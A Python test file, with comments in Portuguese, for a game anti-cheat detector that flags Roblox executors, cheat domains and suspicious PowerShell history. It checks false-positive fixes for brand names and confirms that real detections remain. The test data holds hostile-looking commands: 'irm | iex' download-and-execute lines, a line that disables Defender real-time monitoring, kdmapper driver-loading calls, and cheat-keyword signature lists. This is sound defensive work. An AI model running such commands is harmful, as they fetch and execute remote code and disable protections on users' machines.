"""
Regressão de FALSOS POSITIVOS por colisão de marca/produto.

Auditoria encontrou keywords de palavra-única que colidiam com marcas
legítimas — flagando software/conteúdo inocente como executor (HIGH!):
  - "synapse"  → Razer Synapse (software de mouse, milhões de PCs)
  - "ronix"    → Ronix (marca de wakeboard)
  - "valex"    → Valex (marca de cabos)

Corrigido removendo a palavra solta e mantendo variantes específicas
(.exe / "x executor" / domínios). Estes testes garantem que:
  1. As colisões NÃO disparam mais.
  2. Os executores REAIS continuam detectados pelas variantes.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import matching  # noqa: E402


def setup_module(_):
    matching.invalidate()


# Termos LEGÍTIMOS que colidiam — não podem casar
BRAND_COLLISIONS = [
    "razer synapse",
    "razersynapse.exe",
    "RazerSynapse.exe-A1B2C3D4.pf",
    "C:\\Program Files\\Razer\\Synapse3\\RazerSynapse.exe",
    "ronix wakeboard 2024",
    "ronix bindings",
    "ronix wake",
    "valex cables",
    "valex electronics",
]


def test_brand_collisions_do_not_false_positive():
    for t in BRAND_COLLISIONS:
        kw, sev = matching.match_keyword(t)
        assert kw is None, f"FALSO POSITIVO de marca: {t!r} casou com {kw!r} ({sev})"


# Executores REAIS que precisam continuar sendo detectados (via variantes)
EXECUTOR_VARIANTS = [
    ("synapse x", "synapse x"),
    ("synapsex", "synapsex"),
    ("SYNAPSE.EXE-A1B2C3D4.pf", "synapse.exe"),   # Prefetch-style
    ("synapse.exe", "synapse.exe"),
    ("ronix executor", "ronix executor"),
    ("RONIX.EXE-5678.pf", "ronix.exe"),
    ("ronix.cc", "ronix.cc"),
    ("valex executor", "valex executor"),
    ("VALEX.EXE-1234.pf", "valex.exe"),
]


def test_executors_still_detected_via_variants():
    for text, expected in EXECUTOR_VARIANTS:
        kw, sev = matching.match_keyword(text)
        assert kw == expected, f"{text!r} -> {kw!r} (esperado {expected!r}) — perdeu cobertura"
        assert sev == "high"


# ----- Domínio: substring de domínio maior NÃO pode casar -----

def test_domain_boundary_no_substring_fp():
    """wave.gg não pode casar soundwave.gg etc. (era FP de substring)."""
    cases_no = [
        ("wave.gg", "soundwave.gg/music"),
        ("wave.cc", "heatwave.cc"),
        ("wave.dev", "mywave.dev"),
        ("sense.gg", "nonsense.gg"),
        ("coral.gg", "mycoral.gg"),
    ]
    for dom, text in cases_no:
        assert not matching.domain_in_text(dom, text), \
            f"FP de domínio: {dom!r} casou {text!r}"


def test_domain_boundary_real_domains_match():
    """Domínio real e subdomínio legítimo DEVEM casar."""
    cases_yes = [
        ("wave.gg", "wave.gg"),
        ("wave.gg", "https://wave.gg/download"),
        ("wave.gg", "data.wave.gg"),        # subdomínio real
        ("solara.cc", "baixou de solara.cc hoje"),
        ("xeno.now", "sub.xeno.now"),
    ]
    for dom, text in cases_yes:
        assert matching.domain_in_text(dom, text), \
            f"perdeu match de domínio: {dom!r} em {text!r}"


# ----- word_in_text: fronteira de palavra para listas de substring -----

def test_word_in_text_boundary():
    assert matching.word_in_text("wipe", "wipe.exe")
    assert matching.word_in_text("shred", "shred.exe")
    assert not matching.word_in_text("wipe", "swipe.exe")     # era FP
    assert not matching.word_in_text("shred", "shredder pics")  # era FP


# ----- command_history não pode bypassar o matching central -----

def test_command_history_uses_central_matching():
    """command_history fazia substring de EXECUTOR_KEYWORDS/SUSPICIOUS_DOMAINS,
    bypassando word-boundary. Agora usa o matching central — sem FP."""
    import command_history as ch
    # FPs que o substring causava:
    assert ch._match_in_line("cd C:/solarapanel/docs")[0] is None
    assert ch._match_in_line("visited soundwave.gg yesterday")[0] is None
    # detecção real preservada:
    assert ch._match_in_line("run solara.exe")[0] is not None
    kw, sev = ch._match_in_line("iex(downloadstring https://solara.cc/x)")
    assert kw is not None and sev == "high"


# ----- v3.29.1: keyword dentro de regex de busca não é execução -----

def test_powershell_search_regex_not_flagged():
    """REGRESSÃO FP: `Where-Object -match 'winring0|kdmapper|gmer'` é AUDITORIA
    procurando esses tokens. Os tokens estão dentro de uma string de busca —
    não estão sendo executados."""
    import command_history as ch
    line = ("Get-CimInstance Win32_SystemDriver | Where-Object PathName "
            "-match 'winring0|mhyprot|capcom|gdrv|iqvw64|kdmapper|gmer' "
            "| Select-Object Name, State, PathName")
    kw, sev = ch._match_in_line(line)
    assert kw is None, f"FP: matched '{kw}' dentro de regex de busca"


def test_powershell_select_string_not_flagged():
    """Select-String 'kdmapper' = procurar log por kdmapper, não rodar kdmapper."""
    import command_history as ch
    kw, _ = ch._match_in_line("Get-Content log.txt | Select-String 'kdmapper'")
    assert kw is None


def test_powershell_findstr_not_flagged():
    """findstr "solara" arquivo.txt = grep, não execução."""
    import command_history as ch
    kw, _ = ch._match_in_line('findstr /c:"solara" suspeitos.txt')
    assert kw is None


def test_powershell_real_execution_still_flagged():
    """Não pode regredir: rodar de fato continua sendo detectado."""
    import command_history as ch
    # Sem verbo de busca, kdmapper na CLI = execução real
    assert ch._match_in_line(".\\kdmapper.exe driver.sys")[0] is not None
    assert ch._match_in_line("Start-Process kdmapper")[0] is not None
    # Mesmo com pipe, mas sem verbo de busca, é execução
    assert ch._match_in_line("kdmapper | tee log.txt")[0] is not None


def test_powershell_search_pattern_helper():
    """Núcleo da heurística — testes mínimos."""
    import command_history as ch
    # Regex enumeration ao redor do keyword
    assert ch._is_search_pattern(
        "Where-Object -match 'a|kdmapper|b'", "kdmapper") is True
    # Literal entre aspas com verbo de busca
    assert ch._is_search_pattern("Select-String 'kdmapper'", "kdmapper") is True
    # Sem verbo de busca = não é
    assert ch._is_search_pattern("kdmapper.exe driver", "kdmapper") is False
    # Verbo de busca mas keyword fora da regex = não é (caso raro)
    assert ch._is_search_pattern(
        "kdmapper; Where-Object -match 'algo'", "kdmapper") is False


# ===== FP: lista de assinatura (script anti-cheat / o próprio Telador) =====

def test_signature_list_assignment_not_flagged():
    """REGRESSÃO FP: `$cheat = 'solara|xeno|...'` é a WORDLIST de um script de
    screenshare/anti-cheat (ou do próprio Telador) caindo no PS history — não
    é cheat rodando. Sem verbo de busca, o _is_search_pattern não pegava."""
    import command_history as ch
    line = ("$cheat = 'solara|xeno|wave|krnl|fluxus|velocity|ronix|synapse|"
            "swift|celery|hydrogen|delta|arceus|codex|seliware|comet|trigon|"
            "awp|macsploit|exploit|injector|executor|loader|bootstrap'")
    kw, sev = ch._match_in_line(line)
    assert kw is None, f"FP: lista de assinatura casou '{kw}' ({sev})"


def test_signature_list_helper():
    """Núcleo: precisa de '|' E de vários executores DISTINTOS (que casem bare)."""
    import command_history as ch
    assert ch._is_signature_list("'solara|krnl|fluxus'") is True
    # Um executor só, mesmo com pipe (pipeline real), NÃO é lista
    assert ch._is_signature_list("krnl | tee log.txt") is False
    # Sem pipe nenhum, não é lista
    assert ch._is_signature_list("run solara.exe") is False


def test_single_executor_still_flagged_despite_pipe():
    """Não pode regredir: rodar UM executor com pipe continua detectado."""
    import command_history as ch
    assert ch._match_in_line("solara.exe | tee log.txt")[0] is not None
    assert ch._match_in_line(".\\krnl.exe")[0] is not None


# ===== FP: download+exec de domínio CONFIÁVEL (allowlist) =====
# TRUSTED_DOMAINS nasce VAZIO (só popula de trusted_domains.json local), então
# os testes injetam um domínio sintético e limpam depois — herméticos, não
# dependem do arquivo local existir.

_TRUSTED_TEST_DOMAIN = "allowlisted.test"


def _with_trusted(fn):
    """Roda fn() com _TRUSTED_TEST_DOMAIN na allowlist e limpa no fim."""
    import database
    database.TRUSTED_DOMAINS.add(_TRUSTED_TEST_DOMAIN)
    try:
        fn()
    finally:
        database.TRUSTED_DOMAINS.discard(_TRUSTED_TEST_DOMAIN)


def test_trusted_domain_irm_iex_not_flagged():
    """REGRESSÃO FP: `irm "https://<confiável>/..." | iex` é instalador legítimo
    do dono (steamtools). irm/iex são HIGH sozinhos, mas vindo de domínio
    confiável não é flag."""
    import command_history as ch
    def check():
        assert ch._match_in_line(
            f'irm "https://{_TRUSTED_TEST_DOMAIN}/install-plugin.ps1" | iex')[0] is None
        assert ch._match_in_line(
            f'iex (irm https://{_TRUSTED_TEST_DOMAIN}/install-plugin-legacy.ps1)')[0] is None
    _with_trusted(check)


def test_trusted_domain_does_not_clear_independent_redflag():
    """Domínio confiável só limpa download/exec — red flag INDEPENDENTE (bypass
    de Defender) na mesma linha continua acendendo."""
    import command_history as ch
    def check():
        kw, sev = ch._match_in_line(
            f'irm https://{_TRUSTED_TEST_DOMAIN}/x | iex; '
            'Set-MpPreference -DisableRealtimeMonitoring $true')
        assert kw is not None and sev == "high"
    _with_trusted(check)


def test_untrusted_domain_irm_iex_still_flagged():
    """Não pode regredir: irm|iex de domínio qualquer (não-allowlist) continua HIGH."""
    import command_history as ch
    kw, sev = ch._match_in_line('irm "https://rando.example/x.ps1" | iex')
    assert kw is not None and sev == "high"


# ===== FP v3.38.1: bare folder names colidindo com software legítimo =====

def test_generic_folder_names_dont_match():
    """REGRESSÃO FP: SUSPICIOUS_FOLDER_NAMES casa o nome EXATO da pasta. Bare
    words genéricos colidiam com software legítimo cuja pasta tem esse nome:
      codex → OpenAI Codex · argon → Argon (Rojo) · electron → Electron
      hydrogen → Hydrogen (sequencer) · sentinel → Sentinel · cryptic → Cryptic Studios
    Visto na máquina do dev: pasta 'Codex' flaggava HIGH como executor."""
    from database import SUSPICIOUS_FOLDER_NAMES as S
    for name in ("codex", "argon", "electron", "hydrogen", "sentinel", "cryptic"):
        assert S.get(name) is None, f"'{name}' não devia estar em SUSPICIOUS_FOLDER_NAMES (FP)"


def test_removed_executors_still_covered():
    """Os executores removidos da lista de pastas continuam pegos por variantes
    específicas (process name / domínio / 'X executor')."""
    import matching
    from database import EXECUTOR_PROCESS_NAMES
    assert matching.match_keyword("codex.lol")[0] is not None
    assert matching.match_keyword("Codex Executor")[0] is not None
    assert EXECUTOR_PROCESS_NAMES.get("codex.exe") == "high"
    assert matching.match_keyword("argon executor")[0] is not None
    assert matching.match_keyword("electron exploit")[0] is not None
    assert matching.match_keyword("hydrogen.exe")[0] is not None
    assert matching.match_keyword("sentinel exploit")[0] is not None
    assert matching.match_keyword("cryptic exec")[0] is not None
